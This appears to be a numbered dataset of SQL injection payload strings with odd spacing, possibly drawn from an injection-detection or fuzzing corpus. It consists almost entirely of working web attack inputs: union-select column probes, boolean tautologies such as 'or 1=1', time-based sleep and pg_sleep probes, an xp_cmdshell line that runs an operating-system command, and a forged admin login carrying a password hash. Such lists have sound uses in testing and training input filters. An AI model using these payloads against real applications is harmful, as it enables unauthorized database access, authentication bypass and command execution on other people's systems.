0 1%'   )    )    union all select null,null# 
1 -8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793# 
3 1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347-- 
8 1%' union all select null,null,null# 
10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
22 select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg 
23 1   )    )     )   and sleep  (  5  )  # 
40 -7202%"   )    )    union all select 2901# 
43 1"  )   and sleep  (  5  )  # 
61  or 'something'   =   'some'+'thing' 
71  select * from users where id  =  1 or 1#"? union select null,version  (    )   -- 1 
72 select 
75 1   )    )     )   rlike sleep  (  5  )  # 
80 1 order by 1-- 
82 1'+  (  select iutk where 6158  =  6158 
83 -4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# 
86 -9891" union all select 7489# 
89 1  )   where 4992  =  4992 
93 1"   )    )     )   
96  select * from users where id  =  1 or 1#"{ union select null,version  (    )   -- 1 
101 1 where 2060  =  2060 
112 1" order by 1# 
113 -2071 union all select 4753,4753-- 
119 -5560"   )    )    or 7292  =  6184# 
137  having 1  =  1-- 
143 -5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# 
157 1%' union all select null,null,null-- 
162 or 1  =  1/* 
168 1" where 7796  =  7796 
171  or userid like '% 
174  )   or   (  'x'  =  'x 
179 1'  )   as rhvm where 1420  =  1420 
182 -- &password  =  
183 select case when 5559  =  3483 then 1 else null end-- 
186 select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw 
190 1   )    )  
192 -4955%' union all select 5928,5928-- 
199 select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1 
200 1'||  (  select 'etvo' from dual where 1557  =  1557 
205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
211  end and "%"  =  " 
217 select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa 
220 *| 
227 select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1 
235 -5327'   )    )     )   or 1606  =  6099 
